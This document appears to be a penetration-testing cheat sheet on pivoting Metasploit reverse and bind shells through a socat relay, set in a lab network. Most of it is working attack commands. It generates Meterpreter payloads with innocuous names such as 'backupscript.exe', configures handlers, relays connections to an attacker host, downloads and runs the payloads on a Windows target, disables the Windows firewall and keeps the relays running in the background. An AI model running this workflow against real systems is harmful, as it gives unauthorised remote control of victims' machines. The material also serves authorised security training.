# Socat Redirection Quick Reference

## What is Socat?

**Socat** = Bidirectional relay tool that redirects traffic between two independent network channels

**Use Cases**: 
- Redirect reverse shells through pivot
- Redirect bind shells through pivot
- No SSH tunneling required

## Socat Reverse Shell Redirection

### Concept
```
Windows Target
    ↓
Connects to Pivot:8080 (Socat listener)
    ↓
Socat redirects to Attack Host:80
    ↓
Metasploit handler receives connection
```

### Step 1: Start Socat on Pivot
```bash
# On pivot host (Ubuntu)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Step 2: Start Handler on Attack Host
```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

### Step 3: Create Reverse Shell Payload
```bash
# Payload connects to pivot
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 \
         LPORT=8080 \
         -f exe \
         -o backupscript.exe
```

### Step 4: Transfer & Execute
```bash
# Transfer to pivot
scp backupscript.exe ubuntu@10.129.202.64:~/

# Host on pivot
python3 -m http.server 8123

# Download on Windows
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Execute
C:\backupscript.exe
```

### Step 5: Receive Connection
```
[*] Started HTTPS reverse handler on https://0.0.0.0:80
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)

meterpreter > getuid
```

## Socat Bind Shell Redirection

### Concept
```
Attack Host
    ↓
Connects to Pivot:8080 (Socat listener)
    ↓
Socat redirects to Windows:8443
    ↓
Windows bind shell payload listening
```

### Step 1: Create Bind Shell Payload
```bash
# Windows listens on port 8443
msfvenom -p windows/x64/meterpreter/bind_tcp \
         LPORT=8443 \
         -f exe \
         -o backupjob.exe
```

**Note**: No LHOST needed for bind shells (target listens)

### Step 2: Transfer & Execute Payload
```bash
# Transfer to Windows
# (via web server, SMB, RDP, etc.)

# Execute on Windows
C:\backupjob.exe

# Windows now listening on 172.16.5.19:8443
```

### Step 3: Start Socat Redirector on Pivot
```bash
# On pivot (Ubuntu)
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Explanation**:
- Listen on pivot port 8080
- Forward connections to Windows 172.16.5.19:8443

### Step 4: Configure Bind Handler on Attack Host
```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

**Important**:
- `RHOST` = Pivot external IP (where socat listens)
- `LPORT` = Socat listening port

### Step 5: Establish Connection
```
[*] Started bind TCP handler against 10.129.202.64:8080
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080)

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

## Reverse vs Bind Shell Comparison

| Feature | Reverse Shell | Bind Shell |
|---------|---------------|------------|
| **Target** | Connects out | Listens/waits |
| **Firewall** | Easier (outbound) | Harder (inbound) |
| **Payload LHOST** | Pivot IP | Not used |
| **Payload LPORT** | Socat port | Target listen port |
| **Handler Type** | Reverse handler | Bind handler |
| **Handler RHOST** | 0.0.0.0 | Pivot IP |
| **Socat Direction** | Inbound → Attacker | Outbound → Target |

## Network Flow Diagrams

### Reverse Shell Flow
```
┌─────────────────┐
│ Windows Target  │  Executes reverse shell
│  172.16.5.19    │  Connects to →
└────────┬────────┘
         │ 172.16.5.129:8080
         ↓
┌─────────────────┐
│  Pivot (Ubuntu) │  Socat redirects →
│  172.16.5.129   │
│  10.129.202.64  │
└────────┬────────┘
         │ 10.10.14.18:80
         ↓
┌─────────────────┐
│  Attack Host    │  Handler receives
│  10.10.14.18    │
└─────────────────┘
```

### Bind Shell Flow
```
┌─────────────────┐
│  Attack Host    │  Handler connects →
│  10.10.14.18    │
└────────┬────────┘
         │ 10.129.202.64:8080
         ↓
┌─────────────────┐
│  Pivot (Ubuntu) │  Socat forwards →
│  172.16.5.129   │
│  10.129.202.64  │
└────────┬────────┘
         │ 172.16.5.19:8443
         ↓
┌─────────────────┐
│ Windows Target  │  Bind shell listening
│  172.16.5.19    │
└─────────────────┘
```

## Complete Examples

### Reverse Shell (Full Workflow)
```bash
# ATTACK HOST
# Create payload
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -o shell.exe

# Start handler
msfconsole -x "use multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; \
  set LPORT 80; \
  run"

# PIVOT HOST
# Start socat
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Host payload
python3 -m http.server 8123

# WINDOWS TARGET
# Download and execute
iwr http://172.16.5.129:8123/shell.exe -OutFile C:\shell.exe
C:\shell.exe

# RESULT: Reverse shell via pivot
```

### Bind Shell (Full Workflow)
```bash
# ATTACK HOST
# Create payload
msfvenom -p windows/x64/meterpreter/bind_tcp \
         LPORT=8443 \
         -f exe -o bind.exe

# Transfer to Windows (via web/SMB/RDP)

# WINDOWS TARGET
# Execute (starts listener on 8443)
C:\bind.exe

# PIVOT HOST
# Start socat redirector
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# ATTACK HOST
# Connect via bind handler
msfconsole -x "use multi/handler; \
  set payload windows/x64/meterpreter/bind_tcp; \
  set RHOST 10.129.202.64; \
  set LPORT 8080; \
  run"

# RESULT: Bind shell connection via pivot
```

## Socat Syntax Reference

### Reverse Shell Redirector
```bash
socat TCP4-LISTEN:PIVOT_PORT,fork TCP4:ATTACKER_IP:ATTACKER_PORT
```

### Bind Shell Redirector
```bash
socat TCP4-LISTEN:PIVOT_PORT,fork TCP4:TARGET_IP:TARGET_PORT
```

### Examples
```bash
# Reverse shell redirect
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Bind shell redirect
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# HTTPS reverse shell
socat TCP4-LISTEN:443,fork TCP4:10.10.14.18:443

# Custom bind shell
socat TCP4-LISTEN:9001,fork TCP4:192.168.1.100:4444
```

## Common Socat Patterns

### HTTP Redirect
```bash
socat TCP4-LISTEN:80,fork TCP4:10.10.14.18:8080
```

### HTTPS Redirect
```bash
socat TCP4-LISTEN:443,fork TCP4:10.10.14.18:443
```

### Multiple Redirects (separate terminals)
```bash
# Terminal 1 - Reverse shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Terminal 2 - Bind shell
socat TCP4-LISTEN:8081,fork TCP4:172.16.5.19:8443
```

### With Logging
```bash
socat -d -d TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## Payload Creation Reference

### Reverse Shells
```bash
# HTTPS (recommended)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOT_IP LPORT=8080 -f exe -o shell.exe

# TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=PIVOT_IP LPORT=8080 -f exe -o shell.exe

# HTTP
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=PIVOT_IP LPORT=8080 -f exe -o shell.exe
```

### Bind Shells
```bash
# TCP
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o bind.exe

# Named pipe
msfvenom -p windows/x64/meterpreter/bind_named_pipe PIPENAME=msf -f exe -o bind.exe
```

## Handler Configuration

### Reverse Shell Handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0       # Listen on all interfaces
set LPORT 80            # Port socat forwards to
run
```

### Bind Shell Handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64 # Pivot external IP
set LPORT 8080          # Socat listening port
run
```

## When to Use Each Type

### Use Reverse Shell When:
- ✅ Target has outbound firewall rules
- ✅ Target can initiate connections
- ✅ Egress filtering is weak
- ✅ Standard pentesting scenario

### Use Bind Shell When:
- ✅ Target has inbound access allowed
- ✅ Reverse shell fails due to egress filtering
- ✅ Need persistent listener on target
- ✅ Multiple attackers need access

## Troubleshooting

### Reverse Shell Issues

#### No Connection Received
```bash
# Check socat running
ps aux | grep socat
netstat -tlnp | grep 8080

# Check handler listening
netstat -tlnp | grep 80

# Verify pivot reachable from Windows
# On Windows:
Test-NetConnection 172.16.5.129 -Port 8080
```

#### Connection Drops
```bash
# Use stable payload
msfvenom -p windows/x64/meterpreter/reverse_https ...

# Check firewall
sudo iptables -L
```

### Bind Shell Issues

#### Cannot Connect to Bind Shell
```bash
# Verify payload executed on Windows
# Check if Windows listening
netstat -an | findstr 8443

# Verify socat can reach Windows
# On pivot:
nc -zv 172.16.5.19 8443
telnet 172.16.5.19 8443
```

#### Socat Cannot Forward
```bash
# Check Windows firewall
# On Windows:
netsh advfirewall show allprofiles

# Disable temporarily for testing
netsh advfirewall set allprofiles state off
```

## Verification Commands

### On Pivot Host
```bash
# Check socat running
ps aux | grep socat

# Check listening ports
netstat -tlnp | grep socat
lsof -i :8080

# Watch connections
socat -d -d TCP4-LISTEN:8080,fork TCP4:TARGET_IP:PORT
```

### On Attack Host
```bash
# Check handler
netstat -tlnp | grep msfconsole

# Test connectivity to pivot
nc -zv 10.129.202.64 8080
```

### On Windows Target
```powershell
# Check if bind shell listening
netstat -an | findstr 8443

# Check connectivity to pivot
Test-NetConnection 172.16.5.129 -Port 8080
```

## Advanced Socat Usage

### Bind to Specific Interface
```bash
socat TCP4-LISTEN:8080,fork,bind=172.16.5.129 TCP4:10.10.14.18:80
```

### With IP Restrictions
```bash
socat TCP4-LISTEN:8080,fork,range=10.10.14.0/24 TCP4:172.16.5.19:8443
```

### UDP Redirect
```bash
socat UDP4-LISTEN:8080,fork UDP4:10.10.14.18:80
```

## Running Socat Persistently

### Background with nohup
```bash
nohup socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 > /dev/null 2>&1 &
```

### With screen
```bash
screen -dmS socat-reverse socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
screen -dmS socat-bind socat TCP4-LISTEN:8081,fork TCP4:172.16.5.19:8443
```

### With tmux
```bash
tmux new -d -s socat 'socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80'
```

## Key Differences Summary

### Reverse Shell
- **Payload**: Needs LHOST (pivot IP) + LPORT
- **Handler**: LHOST=0.0.0.0, LPORT=(where socat forwards)
- **Socat**: Forwards incoming → attack host
- **Traffic**: Windows → Pivot → Attacker

### Bind Shell
- **Payload**: Only needs LPORT (no LHOST)
- **Handler**: RHOST=(pivot IP), LPORT=(socat port)
- **Socat**: Forwards outgoing → Windows target
- **Traffic**: Attacker → Pivot → Windows

## Quick Commands

```bash
# Install socat
sudo apt install socat

# Reverse shell redirector
socat TCP4-LISTEN:8080,fork TCP4:ATTACK_IP:80

# Bind shell redirector
socat TCP4-LISTEN:8080,fork TCP4:TARGET_IP:8443

# Reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOT_IP LPORT=8080 -f exe -o shell.exe

# Bind shell payload
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o bind.exe
```

## Key Points

🔴 **Remember**:
- Reverse shell = Target connects out
- Bind shell = Target listens, you connect in
- Socat = Transparent redirect (no encryption)
- Handler config differs between reverse/bind
- Always specify correct RHOST for bind shells

🎯 **Port Mapping**:
```
Reverse: Windows → Pivot:8080 → Attack:80
Bind:    Attack → Pivot:8080 → Windows:8443
```

